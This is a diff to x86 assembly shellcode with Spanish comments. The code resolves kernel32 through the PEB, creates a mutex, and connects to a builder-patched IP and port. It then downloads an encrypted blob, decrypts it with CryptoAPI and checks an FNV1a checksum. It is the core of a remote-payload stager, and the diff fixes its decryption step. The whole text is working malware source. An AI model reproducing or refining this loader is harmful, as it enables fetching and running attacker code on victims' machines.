@@ -218,7 +218,7 @@ redo:
         mov  esi, [eax+0x0C]            //ESI = PEB->Ldr
         mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
 next_module:
-        mov  eax, [esi+0x20]            //EAX = PEB->Ldr.InInitOrder[X].module_name (unicode)
+        mov  eax, [esi+0x20]            //EAX = PEB->Ldr.InInitOrder[X].module_name (UNICODE)
         cmp  [eax+0xC], '3'             //module_name[6] == '3'?
         mov  eax, [esi+0x08]            //EAX = PEB->Ldr.InInitOrder[X].base_address
         mov  esi, [esi]                 //ESI = PEB->Ldr.InInitOrder[X].flink (NextModule)
@@ -296,10 +296,10 @@ xornext:
         push [ebp+_pMUTEX]              //v
         push edx                        //v
         push edx                        //v
-        call [ebp+_CreateMutexA]        //> CreateMutexA(NULL, False, &MUTEX)
+        call [ebp+_CreateMutexA]        //>CreateMutexA(NULL, False, &MUTEX)
         cdq                             //EDX = 0
         mov  edx, DWORD PTR FS:[edx+0x18]//v
-        mov  eax, [edx+0x34]            //> GetLastError()
+        mov  eax, [edx+0x34]            //>GetLastError()
 #ifdef ERR_CHECK
         xor  al, 0xB7
         push ERR_MTX
@@ -345,7 +345,7 @@ copy_done:
 #define BUFF_SIZE 0x5000
 _cont:  xor  eax, eax                   //EAX = 0
         mov  ah, 0x50                   //EAX = BUFF_SIZE
-        call CreateBuff
+        call CreateBuff                 //CreateBuff(BUFF_SIZE)
         mov  [ebp+_pBuff], eax          //pBuffer = EAX
 
         /*###############################################################################
@@ -399,7 +399,7 @@ connect_loop:
 #define PORT 0xD0070002
         //Construimos la sockaddr_in en la pila
         push eax                        //push IP
-        pushc(PORT)                     //push PORT            (TODO:<<<< EL BUILDER PARCHEARÁ ESTO!!!! :D)
+        pushc(PORT)                     //push PORT            (TO DO:<<<< EL BUILDER PARCHEARÁ ESTO!!!! :D)
         mov  ebx, esp                   //EBX = &sockaddr_in
 
         push 0x10                       //v size(sockaddr_in)
@@ -491,8 +491,9 @@ init_decrypt:
         call [ebp+_CryptSetKeyParam]    //>CryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0);
 
         //Restamos el IV a los datos
-        add  [ebp+_pBuff], 16           //pBuff+= 16
-        sub  [ebp+_buffLen], 16         //buffLen-= 16
+        add  DWORD PTR[ebp+_pBuff], 16          //pBuff+= 16
+        sub  DWORD PTR[ebp+_buffLen], 16        //buffLen-= 16
+        push [ebp+_buffLen]                     //Guardamos SizeOfPayLoad+4
 
         //Finalmente desciframos los datos obtenidos
         //Los datos se encuentran en el paquete así: IV(16Bytes)+DataEncrypt
@@ -504,19 +505,20 @@ init_decrypt:
         push esp                        //v
         push [ebp+_pBuff]               //v
         push edx                        //v
-        push edx                        //v
+        push 1                          //v
         push edx                        //v
         push [ebp+_hKey]                //v
-        call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, False, 0, pBuff, &buffLen);
+        call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, True, 0, pBuff, &buffLen);
 
-        pop  ecx                        //Borramos la variable temporal
+        pop  edx                        //Descartamos la variable temporal
+        pop  ecx                        //Recuperamos SizeOfPayload+4
         test eax, eax                   //v
         jz   KillSocket                 //(EAX==0)? Si EAX es cero es que no se ha descifrado correctamente.
                                         // Posiblemente la cantidad recibida no sea multiple de 16
         /*###############################################################################
         ** Comprobación del checksum:
         **    El checksum esta en +16 de los datos recibidos.
-        **    El algoritmo utilizado para calcular el checksum es: 
+        **    El algoritmo utilizado para calcular el checksum es:
         **        *FNV1a (http://goo.gl/1A7ir)
         **    (Elegido por una buena relación tamaño-calidad)
         *###############################################################################*/
